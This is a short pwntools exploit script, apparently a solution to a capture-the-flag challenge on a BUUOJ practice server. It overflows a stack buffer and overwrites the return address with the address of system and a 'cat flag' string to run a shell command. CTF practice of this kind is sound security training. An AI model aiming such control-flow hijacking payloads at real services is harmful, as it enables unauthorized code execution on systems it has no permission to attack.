from pwn import *


# p = process("./memory")
p = remote("node4.buuoj.cn", 26858)

system = 0x080485BD 
cat_flag = 0x080487E0


pad = cyclic(0x13+0x4)
# the ret addr must be a valid addr,
# because "strncmp" func use this as the argc
pad += p32(system)+p32(system)+p32(cat_flag)
p.sendline(pad)

p.interactive()


